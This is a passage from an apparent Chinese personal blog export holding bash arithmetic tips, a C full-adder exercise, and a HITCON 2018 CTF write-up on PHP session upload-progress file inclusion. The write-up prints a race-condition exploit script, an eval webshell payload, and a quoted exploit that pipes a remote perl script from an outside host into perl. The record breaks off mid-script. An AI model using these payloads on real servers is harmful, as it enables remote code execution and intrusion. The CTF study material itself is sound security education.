/flag"&#125;&#125;]&#125;'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    visit /</span></span><br><span class="line"><span class="string">    '''</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>bash shell 使用小技巧</title>
    <url>/2016/05/05/bash%20shell%20%E4%BD%BF%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>近来一直在写一个python的分布式爬虫,写了很多的文件和目录,于是就想统计一下我到底这几天写了多少行代码,这么一个小功能如果也用python来实现,就有点杀鸡用牛刀的感觉了,所以第一想法就是用shell来写了,所以就有了下面这个文章.</p>
<a id="more"></a>

<p>0x1.在其他语言中,如果想实现两个整数的相加求和,直接加就好了,但是bash中可不是你想的那样,例如:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">a=1</span><br><span class="line">b=2</span><br><span class="line"></span><br><span class="line">a=$&#123;a&#125;+$&#123;b&#125;</span><br><span class="line">echo $&#123;a&#125;</span><br></pre></td></tr></table></figure>

<p>运行这个,结果会让你目瞪口呆:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">1+2   #结果是这样的,是不是想说<span class="built_in">..</span><span class="built_in">..</span><span class="built_in">..</span>caocao</span><br></pre></td></tr></table></figure>

<p>so,问题来了,我们到底该怎么加呢????</p>
<p>0x2.度娘了一下,我搜集了五种方法,(啥??竟然有五种,我一种都不知道!!!!!!!!)<br>概括起来如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="comment">#!/bin/bash</span></span></span><br><span class="line"></span><br><span class="line">a=1</span><br><span class="line">b=2</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">let</span> a=<span class="variable">$&#123;a&#125;</span>+<span class="variable">$&#123;b&#125;</span> <span class="comment">#第一种方法</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> a=$((<span class="variable">$&#123;a&#125;</span>+<span class="variable">$&#123;b&#125;</span>)) <span class="comment">#第二种方法</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> a=$[<span class="variable">$&#123;a&#125;</span>+<span class="variable">$&#123;b&#125;</span>] <span class="comment">#第三种方法 </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">a=`<span class="built_in">echo</span> -e <span class="string">"<span class="variable">$&#123;a&#125;</span> <span class="variable">$&#123;b&#125;</span>"</span> | awk <span class="string">'&#123;print $1+$2&#125;'</span>` <span class="comment">#第四种方法 </span></span></span><br><span class="line"></span><br><span class="line">a=`expr $&#123;a&#125; + $&#123;b&#125;`  #注意加号的左右都是有空格的.否则....... 你自己试试看</span><br><span class="line">echo $&#123;a&#125;</span><br></pre></td></tr></table></figure>

<p>不信你可以试一试,得到可爱的3还真有点不太容易啊</p>
<p>0x3.在写shell脚本的时候难免会遇到循环,但是怎是实现变量的自增呢???</p>
<p>其实跟上面的方法很类似,如下</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">i</span>=0</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -lt 4 ];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">echo <span class="variable">$i</span>;</span><br><span class="line"><span class="comment"># i=`expr $i + 1`;  #第一种</span></span><br><span class="line"><span class="comment"># let i+=1;             #二</span></span><br><span class="line"><span class="comment"># ((i++));               #三</span></span><br><span class="line"><span class="comment"># i=$[$i+1];          #四</span></span><br><span class="line"><span class="attribute">i</span>=$(( <span class="variable">$i</span> + 1 ))       #五</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<p>对于固定次数的循环，可以通过seq命令来实现，就不需要变量的自增了</p>
<p>代码如下,</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> $(seq 1 5)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$j</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<pre>0x4.好了,终于学会了加法,下面就看我怎么统计了</pre>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 递归搜索目录,获取路径</span></span><br><span class="line"></span><br><span class="line">names=`find | grep <span class="string">'py$'</span>`   <span class="comment">#只找py文件</span></span><br><span class="line"></span><br><span class="line">line=0</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span>  <span class="variable">$&#123;names&#125;</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">linetmp=`cat <span class="variable">$&#123;name&#125;</span> | wc -l`   <span class="comment">#统计每个文件的行数</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;name&#125;</span> : <span class="variable">$&#123;linetmp&#125;</span></span><br><span class="line">line=$((line+linetmp))</span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"总行数:"</span> <span class="variable">$&#123;line&#125;</span></span><br></pre></td></tr></table></figure>

<p>&nbsp;</p>
<p>好了,搞定…..</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言实现一位全加器</title>
    <url>/2017/03/01/c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%BD%8D%E5%85%A8%E5%8A%A0%E5%99%A8/</url>
    <content><![CDATA[<p>暑假的时候来信工所参加夏令营,当时面试的时候出了个题目说让我们不用加号实现两个数相加.<br>用c语言实现.当时不知道是紧张还是怎么了,改了好几次都没写对.</p>
<a id="more"></a>

<p>现在马上要复试了,心里还是有些压力的,今晚没什么事情干,就敲两行代码.把这个实现一下.证明自己是会写的<br>希望这次复试中的机试要做好点.</p>
<p>其实不用加号来实现加法,其实就是写一个全加器,知道了运算规则,就相当简单.<br>如果想写的复杂点,可以实现一下3位全加器或者4位全加器.</p>
<p>由于我逻辑运算忘记的差不多了,不太会写多位全加器的逻辑表达式了,这里就先写个一位的全加器吧. </p>
<ul>
<li>用 S(i)代表i位的最终结果,C(i)为第i位的进位,A(i)和B(i)分别代表两个加数<br>这逻辑关系可以表示为:<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="constructor">S(<span class="params">i</span>)</span> = <span class="constructor">A(<span class="params">i</span>)</span>^<span class="constructor">B(<span class="params">i</span>)</span>^<span class="constructor">C(<span class="params">i</span>-1)</span></span><br><span class="line"><span class="constructor">C(<span class="params">i</span>)</span> = (<span class="constructor">A(<span class="params">i</span>)</span>&amp;<span class="constructor">B(<span class="params">i</span>)</span>)<span class="pattern-match">|((<span class="constructor">A(<span class="params">i</span>)</span>^<span class="constructor">B(<span class="params">i</span>)</span>)&amp;<span class="constructor">C(<span class="params">i</span>-1)</span>)</span></span><br></pre></td></tr></table></figure>
下面就是代码实现,比较简单,不再解释:</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span>  <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> a_array[<span class="number">32</span>];  <span class="comment">//存储a的二进制位</span></span><br><span class="line">    <span class="keyword">bool</span> b_array[<span class="number">32</span>];  <span class="comment">//存储b的二进制位 </span></span><br><span class="line">    <span class="keyword">bool</span> result[<span class="number">32</span>]; <span class="comment">//保存结果</span></span><br><span class="line">    <span class="keyword">bool</span> c=<span class="number">0</span>; <span class="comment">//用来保存进位 </span></span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">       a_array[i] = a &amp; (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">       b_array[i] = b &amp; (<span class="number">1</span>&lt;&lt;i);  </span><br><span class="line">       result[i] = a_array[i]^b_array[i]^c;</span><br><span class="line">       c = (a_array[i]&amp;b_array[i])|((a_array[i]^b_array[i])&amp;c);</span><br><span class="line">       res = res + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(result[i])*<span class="built_in">pow</span>(<span class="number">2</span>,i);   </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc ,<span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line">      <span class="keyword">int</span> a;</span><br><span class="line">      <span class="keyword">int</span> b;  </span><br><span class="line">      <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">      <span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;add(a,b)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>代码控</category>
      </categories>
      <tags>
        <tag>c</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcon 2018受虐笔记一:one-line-php-challenge 学习</title>
    <url>/2018/10/23/hitcon%202018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%B8%80%20one-line-php-challenge%20%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>都是老知识，但是我依然不会做。。。。蓝瘦</p>
<a id="more"></a>

<h2 id="0x1-历史回顾"><a href="#0x1-历史回顾" class="headerlink" title="0x1 历史回顾"></a>0x1 历史回顾</h2><p>任意文件包含漏洞，如果<code>session.upload_progress.enabled=On</code>开启，就可以包含session来getshell。这种思路在CTF中已经被利用了N多次了。在这里再回顾一下，加深一下印象。</p>
<p>参考Session 上传进度的文档<a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">http://php.net/manual/zh/session.upload-progress.php</a></p>
<p><img src="http://pic.wonderkun.cc/uploads/2018/10/1.png" alt="http://pic.wonderkun.cc/uploads/2018/10/1.png"></p>
<p>手册上有一个例子，如下:</p>
<p>一个上传进度数组的结构的例子</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"&lt;?php echo ini_get("</span><span class="attr">session.upload_progress.name</span>"); ?&gt;</span>" value="123" /&gt;</span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file1"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file2"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在session中存放的数据看上去是这样子的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_SESSION[<span class="string">"upload_progress_123"</span>] = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time</span></span><br><span class="line"> <span class="string">"content_length"</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length</span></span><br><span class="line"> <span class="string">"bytes_processed"</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed</span></span><br><span class="line"> <span class="string">"done"</span> =&gt; <span class="keyword">false</span>,              <span class="comment">// true when the POST handler has finished, successfully or not</span></span><br><span class="line"> <span class="string">"files"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">  <span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">"field_name"</span> =&gt; <span class="string">"file1"</span>,       <span class="comment">// Name of the &lt;input/&gt; field</span></span><br><span class="line">   <span class="comment">// The following 3 elements equals those in $_FILES</span></span><br><span class="line">   <span class="string">"name"</span> =&gt; <span class="string">"foo.avi"</span>,</span><br><span class="line">   <span class="string">"tmp_name"</span> =&gt; <span class="string">"/tmp/phpxxxxxx"</span>,</span><br><span class="line">   <span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">"done"</span> =&gt; <span class="keyword">true</span>,                <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line">   <span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,    <span class="comment">// When this file has started to be processed</span></span><br><span class="line">   <span class="string">"bytes_processed"</span> =&gt; <span class="number">57343250</span>, <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">  ),</span><br><span class="line">  <span class="comment">// An other file, not finished uploading, in the same request</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">"field_name"</span> =&gt; <span class="string">"file2"</span>,</span><br><span class="line">   <span class="string">"name"</span> =&gt; <span class="string">"bar.avi"</span>,</span><br><span class="line">   <span class="string">"tmp_name"</span> =&gt; <span class="keyword">NULL</span>,</span><br><span class="line">   <span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">   <span class="string">"done"</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">   <span class="string">"start_time"</span> =&gt; <span class="number">1234567899</span>,</span><br><span class="line">   <span class="string">"bytes_processed"</span> =&gt; <span class="number">54554</span>,</span><br><span class="line">  ),</span><br><span class="line"> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>session中存储上传进度的键值是：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ini_get(<span class="string">'session.upload_progress.prefix'</span>).$_POST[ini_get[<span class="string">'session.upload_progress.name'</span>]]；</span><br></pre></td></tr></table></figure>

<p>其中<code>$_POST[ini_get[&#39;session.upload_progress.name&#39;]]；</code>是一个我们可控的值，如果把它控制成一个shell的内容，然后包含session就可以getshell了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"&lt;?php echo ini_get("</span><span class="attr">session.upload_progress.name</span>"); ?&gt;</span>" value="<span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="number">1</span>]); <span class="meta">?&gt;</span></span>" /&gt;</span><br></pre></td></tr></table></figure>

<p>如果<code>session.upload_progress.cleanup=On</code>开启：</p>
<p>Cleanup the progress information as soon as all POST data has been read (i.e. upload completed). Defaults to 1, enabled.</p>
<p>如果POST一被读取，session的内容就会被清空，所以为了在清空之前能包含到有我们payload的session，还需要用条件竞争。</p>
<p>记得当时在@wupco在SCTF2018的题目的非预期解，<a href="https://www.cnblogs.com/iamstudy/articles/sctf2018_simple_php_web_writeup.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/sctf2018_simple_php_web_writeup.html</a></p>
<p>我当时以为<code>session.upload_progress.enabled=On</code>仅仅是个意外，是@l3m0n题目环境的问题，当时今天我才发现，php默认就是开启的…..参考手册：</p>
<p><a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name" target="_blank" rel="noopener">http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name</a></p>
<p><img src="http://pic.wonderkun.cc/uploads/2018/10/2.png" alt="http://pic.wonderkun.cc/uploads/2018/10/2.png"><br>默认就开启的这个性质相当棒啊。。。。</p>
<p>最后给一个利用的exp吧：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">'http://your-ip:8088/'</span></span><br><span class="line">PHPSESSID = <span class="string">'vrhtvjd4j1sd88onr92fm9t2gt'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creatSession</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        files = &#123;</span><br><span class="line">        <span class="string">"upload"</span> : (<span class="string">"tmp.jpg"</span>, open(<span class="string">"/etc/passwd"</span>, <span class="string">"rb"</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> : <span class="string">"&lt;?php echo md5('1');?&gt;"</span> &#125;</span><br><span class="line">        headers = &#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID='</span> + PHPSESSID&#125;</span><br><span class="line">        r = requests.post(host,files = files,headers = headers,data=data)</span><br><span class="line"></span><br><span class="line">fileName = <span class="string">"/var/lib/php/sessions/sess_"</span>+PHPSESSID</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    url = <span class="string">"&#123;&#125;/index.php?file=&#123;&#125;"</span>.format(host,fileName)</span><br><span class="line">    headers = &#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID='</span> + PHPSESSID&#125;</span><br><span class="line">    t = threading.Thread(target=creatSession,args=())</span><br><span class="line">    t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"c4ca4238a0b923820dcc509a6f75849b"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            print(<span class="string">"[*] Get shell success."</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"[-] retry."</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x2-hitcon2018-one-line-php-challenge"><a href="#0x2-hitcon2018-one-line-php-challenge" class="headerlink" title="0x2 hitcon2018 one-line-php-challenge"></a>0x2 hitcon2018 one-line-php-challenge</h2><p>题目代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">($_=@$_GET[<span class="string">'orange'</span>]) &amp;&amp; @substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">'@&lt;?php'</span> ? <span class="keyword">include</span>($_) : highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>题目描述：P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04</p>
<h3 id="php的session-upload-progress-enabled-On引起的一个小问题"><a href="#php的session-upload-progress-enabled-On引起的一个小问题" class="headerlink" title="php的session.upload_progress.enabled=On引起的一个小问题"></a>php的session.upload_progress.enabled=On引起的一个小问题</h3><p>由于这个题目连session都没开，所以我根本就没有考虑去包含session。</p>
<p>但是最后看了orange的exp我才发现，只要发的POST请求中只要包含<code>ini_get(&quot;session.upload_progress.name&quot;)</code>这个键值，并带上session_id，同时进行文件上传，就会直接创建一个session文件。</p>
<p>测试如下，先删除session文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@e5dfc152ed97:/var/lib/php/sessions<span class="comment"># pwd</span></span><br><span class="line">/var/lib/php/sessions</span><br><span class="line">root@e5dfc152ed97:/var/lib/php/sessions<span class="comment"># rm -rf *</span></span><br></pre></td></tr></table></figure>

<p>然后发起请求：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=test</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8088</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.18.4</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=u0hgfruaudns3jigq5trocbr0m</span><br><span class="line"><span class="attribute">Content-Length</span>: 290</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=--------713660820</span><br><span class="line"></span><br><span class="line">----------713660820</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"</span><br><span class="line"></span><br><span class="line"><span class="attribute">test</span></span><br><span class="line"><span class="attribute">----------713660820</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="upload";filename='test'</span><br><span class="line"></span><br><span class="line"><span class="attribute">test</span></span><br><span class="line"><span class="attribute">----------713660820</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line"><span class="attribute">submit</span></span><br><span class="line"><span class="attribute">----------713660820--</span></span><br></pre></td></tr></table></figure>

<p>在服务器端成功的创建了session文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@e5dfc152ed97:/var/lib/php/sessions<span class="comment"># ls</span></span><br><span class="line">sess_u0hgfruaudns3jigq5trocbr0m</span><br></pre></td></tr></table></figure>

<p>emmmmm , php是最好的语言。。。。</p>
<h3 id="利用php-base64-decode-的容错，去掉upload-progress"><a href="#利用php-base64-decode-的容错，去掉upload-progress" class="headerlink" title="利用php base64_decode 的容错，去掉upload_progress_"></a>利用php base64_decode 的容错，去掉upload_progress_</h3><p>session文件的内容如下：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@e5dfc152ed97</span><span class="symbol">:/var/lib/php/sessions</span><span class="comment"># for i in `seq 1 300`; do cat sess_u0hgfruaudns3jigq5trocbr0m ; done</span></span><br><span class="line">upload_progress_@&lt;?php eval(<span class="variable">$_GET</span>[<span class="number">1</span>]);|<span class="symbol">a:</span><span class="number">5</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">10</span><span class="symbol">:<span class="string">"start_time"</span></span>;<span class="symbol">i:</span><span class="number">1540269279</span>;<span class="symbol">s:</span><span class="number">14</span><span class="symbol">:<span class="string">"content_length"</span></span>;<span class="symbol">i:</span><span class="number">315</span>;<span class="symbol">s:</span><span class="number">15</span><span class="symbol">:<span class="string">"bytes_processed"</span></span>;<span class="symbol">i:</span></span><br><span class="line"><span class="number">315</span>;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">"done"</span></span>;<span class="symbol">b:</span>0;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">"files"</span></span>;<span class="symbol">a:</span><span class="number">1</span><span class="symbol">:</span>&#123;<span class="symbol">i:</span>0;<span class="symbol">a:</span><span class="number">7</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">10</span><span class="symbol">:<span class="string">"field_name"</span></span>;<span class="symbol">s:</span><span class="number">6</span><span class="symbol">:<span class="string">"upload"</span></span>;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">"name"</span></span>;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">"test"</span></span>;<span class="symbol">s:</span><span class="number">8</span><span class="symbol">:<span class="string">"tmp_name"</span></span>;N;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">"error"</span></span>;i</span><br><span class="line"><span class="symbol">:</span>0;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">"done"</span></span>;<span class="symbol">b:</span>0;<span class="symbol">s:</span><span class="number">10</span><span class="symbol">:<span class="string">"start_time"</span></span>;<span class="symbol">i:</span><span class="number">1540269279</span>;<span class="symbol">s:</span><span class="number">15</span><span class="symbol">:<span class="string">"bytes_processed"</span></span>;<span class="symbol">i:</span><span class="number">315</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>需要绕过下面这个限制，多了额外的字符<code>upload_progress_</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>) === <span class="string">'@&lt;?php'</span></span><br></pre></td></tr></table></figure>

<p>这里可以利用多次base64解码来去除<code>upload_progress_</code>。</p>
<p>因为base64解码函数可以接受的字符范围是<code>[A-Za-z0-9+/=]</code>，但是如果php的base64_decode遇到了不在此范围内的字符，php就会直接跳过这些字符，只把在此范围的字符连起来进行解码。@phith0n师父早就说过这个问题，而我在做题的时候还是妥妥的忘掉了。。</p>
<p>我们来做个试验：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$i = <span class="number">0</span> ;</span><br><span class="line">$data = <span class="string">"upload_progress_ZZ"</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">    $i += <span class="number">1</span>;</span><br><span class="line">    $data = base64_decode($data); </span><br><span class="line">    var_dump($data);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>($data == <span class="string">''</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"一共解码了:"</span>.$i,<span class="string">"次\n"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">string(<span class="number">12</span>) <span class="string">"��hi�k�</span></span><br><span class="line"><span class="string">޲�Y"</span></span><br><span class="line">string(<span class="number">3</span>) <span class="string">"�)"</span></span><br><span class="line">string(<span class="number">0</span>) <span class="string">""</span></span><br><span class="line">一共解码了:<span class="number">3</span>次</span><br></pre></td></tr></table></figure>

<p><code>upload_progress_ZZ</code>一共是18个字符，但是由于base64_decode跳过了<code>_</code>，所以是剩下16个字符，解码一次之后是12个字符，又因为12个字符中只有4个在范围内，所以再次解码之后变为了3个字符，这三个字符都不在范围内，所以解码之后为空字符串。</p>
<p>这里需要注意的是我们在<code>upload_progress_</code>前缀后面扩展了两位是<code>ZZ</code>，这个<code>ZZ</code>的选择也是非常有讲究的，必须保证每一次的的base64解码之后的可接受字符个数都必须是4的整数倍,否则就会吞掉后面的payload。</p>
<p>举个例子<code>upload_progress_AA</code>就是不满足条件的，因为一次base64解码之后变为了</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="type">string</span>(<span class="number">12</span>) <span class="string">"��hi�k�</span></span><br><span class="line"><span class="string">޲�"</span></span><br></pre></td></tr></table></figure>

<p>可接受字符变为了3个，不是4的倍数，那么在下一次进行base64解码的时候，一定会吞掉后面的一位，导致payload部分被破坏掉。</p>
<p>所以最后控制SESSION的key值为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">"upload_progress_ZZ"</span>.base64_encode(base64_encode(base64_encode(<span class="string">'@&lt;?php eval($_GET[1]);'</span>)));</span><br></pre></td></tr></table></figure>

<p>然后进行三次的base_64decode，就会去掉<code>upload_progress_</code>,只剩下<code>@&lt;?php eval($_GET[1]);</code></p>
<p>最后附上orange的exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> sample, randint</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'http://54.250.246.238/'</span></span><br><span class="line">sess_name = <span class="string">'iamorange'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span>, </span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID='</span> + sess_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'@&lt;?php `curl orange.tw/w/bc.pl|perl -`;?&gt;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    junk = <span class="string">''</span>.join(sample(string.ascii_letters, randint(<span class="number">8</span>, <span class="number">16</span>)))</span><br><span 